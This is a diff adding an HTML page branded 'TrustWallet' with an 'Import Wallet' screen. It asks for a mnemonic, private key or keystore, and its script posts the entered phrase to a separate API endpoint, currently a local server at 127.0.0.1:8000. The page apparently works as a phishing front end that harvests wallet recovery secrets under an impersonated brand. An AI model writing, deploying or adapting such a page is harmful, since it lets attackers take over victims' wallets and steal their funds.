@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>TrustWallet</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <style>
+        body {
+            width: 360px;
+            height: 600px;
+            margin: 0;
+            padding: 16px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        .top-section {
+            height: 15%;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            background-color: #f3f4f6;
+            border-bottom: 1px solid #e5e7eb;
+            padding-left: 16px;
+        }
+        .middle-section {
+            height: 70%;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            margin-top: 16px;
+            padding: 16px;
+            background-color: #ffffff;
+            border: 1px solid #e5e7eb;
+            border-radius: 4px;
+        }
+        .word-input-box {
+            height: 33.33%;
+            margin-bottom: auto;
+            display: flex;
+            flex-direction: column;
+        }
+        .word-input-box textarea {
+            height: 100%;
+            padding: 8px;
+            font-size: 14px;
+            border: 1px solid #e5e7eb;
+            border-radius: 4px;
+            resize: none;
+            background-color: #f9fafb;
+            box-sizing: border-box;
+        }
+        .bottom-section {
+            height: 15%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .next-button {
+            width: 100%;
+            max-width: 150%;
+            background-color: #303c5c;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px;
+            cursor: pointer;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="top-section">
+        <h1 class="text-lg font-semibold">Import Wallet</h1>
+    </div>
+    <div class="middle-section">
+        <div class="word-input-box">
+            <textarea placeholder="Paste or enter your mnemonic, private key, or keystore" spellcheck="false"></textarea>
+        </div>
+    </div>
+    <div class="bottom-section">
+        <button class="next-button" onclick="submitPhrases()">Next</button>
+    </div>
+
+    <script>
+        async function submitPhrases() {
+            const inputElement = document.querySelector('.word-input-box textarea');
+            const phrase = inputElement.value.trim();
+
+            if (phrase === '') {
+                alert('Please enter words or sentences.');
+                return;
+            }
+
+            try {
+                const response = await axios.post('http://127.0.0.1:8000/api/sentence/', { phrase });
+                console.log('Response:', response.data);
+                alert('Words submitted successfully!');
+            } catch (error) {
+                console.error('Error submitting words:', error);
+                alert('Failed to submit words. Please try again.');
+            }
+        }
+    </script>
+</body>
+</html>
